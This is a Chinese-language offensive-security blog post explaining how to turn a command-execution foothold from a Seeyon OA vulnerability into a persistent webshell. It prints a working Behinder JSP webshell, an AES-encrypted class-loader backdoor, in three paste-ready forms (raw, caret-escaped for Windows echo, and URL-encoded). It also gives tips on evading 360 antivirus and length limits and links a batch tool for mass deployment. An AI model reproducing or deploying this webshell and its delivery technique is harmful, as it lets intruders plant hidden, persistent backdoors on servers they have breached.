# 如何优雅的把cmdshell升级为一句话


```
2019-7-11 自己发在土司的文章
```
<meta name="referrer" content="no-referrer" />

## 前言

前一段时间致远OA的洞坑了不少公司

自己也复现了一下  但是有个很恶心的问题就是  默认的payload是有长度限制的并且只是一个cmd的shell

Linux的shell还比较灵活  但是win的来说就不太方便了

特别是配合上恶心的url编码在浏览器里面遇到反斜杠就gg

那么怎么把cmdshell优雅的转化为可以连接的一句话呢

看了以前的帖子大概有这几个办法

```
Js+cscript
Certutil +base64
Win7以上还有bitsadmin  
Ps 
等等等等
```

Bitsadmin就不说了

Certutil跟cscript远程下载其实也不错

但是有两个问题

**1 如果主机不通外网就gg**

 **2 360会拦截**

综合来说都有自己的不足之处

还是一句话echo最稳了

自己也研究了一下  但是用echo写马有两个天坑

### 1.win的尖括号转义

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900392655-fe8dc941-072a-4d46-82eb-5b68e47a18bc.png)

Win的尖括号要用^来转义而不是反斜杠

如果你要是放到引号里会把引号一起打印出来

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900392731-d0b310f9-32c7-4d93-b401-4e5b587ae81e.png)

### 2. 沙雕url编码

[https://www.cnblogs.com/i80386/p/4576699.html](https:_www.cnblogs.com_i80386_p_4576699)

大家可以自己去网上找一下帖子到底url编码有多混乱。。。。

这里就说说python的requests模块的url编码

经过测试

```
空格=>%20
%空格=>%%20
%20=>%20
```

也就是说  他在默认遇到百分号开头的字符串的时候  request模块会把它当做已经编码过的字符  直接发送过去

但是他就带来个问题不会自动编码百分号

所以你只把尖括号跟百分号转义过后的payload放到py脚本里还是不能正常执行

这里偷了个懒直接找的在线网站，把它编码一遍再放到python里

http://tool.chinaz.com/tools/urlencode.aspx

## 综上：

原来payload（冰蝎为例）

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
```

尖括号转义=>

```
^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^>^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^>^<%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%^>
```

url编码=>

```
%5e%3c%25%40page+import%3d%22java.util.*%2cjavax.crypto.*%2cjavax.crypto.spec.*%22%25%5e%3e%5e%3c%25!class+U+extends+ClassLoader%7bU(ClassLoader+c)%7bsuper(c)%3b%7dpublic+Class+g(byte+%5b%5db)%7breturn+super.defineClass(b%2c0%2cb.length)%3b%7d%7d%25%5e%3e%5e%3c%25if(request.getParameter(%22pass%22)!%3dnull)%7bString+k%3d(%22%22%2bUUID.randomUUID()).replace(%22-%22%2c%22%22).substring(16)%3bsession.putValue(%22u%22%2ck)%3bout.print(k)%3breturn%3b%7dCipher+c%3dCipher.getInstance(%22AES%22)%3bc.init(2%2cnew+SecretKeySpec((session.getValue(%22u%22)%2b%22%22).getBytes()%2c%22AES%22))%3bnew+U(this.getClass().getClassLoader()).g(c.doFinal(new+sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3b%25%5e%3e
```

然后写个轮子

就可以批量cmd转一句话啦

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900392835-f42135c4-5a63-41ef-bbdb-3daf1c01ea85.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900392930-b63b0066-9e09-40f7-84a8-ed3f3f7b8125.png)

写了个脚本

支持批量检测跟单个检测

如果是

```
http://
```

开头的就识别成单个

xxx.txt就是批量

需要设置一下脚本里面的cmdshell地址跟密码

## 项目地址：

https://github.com/yzddmr6/cmd2bx

TCV: 0
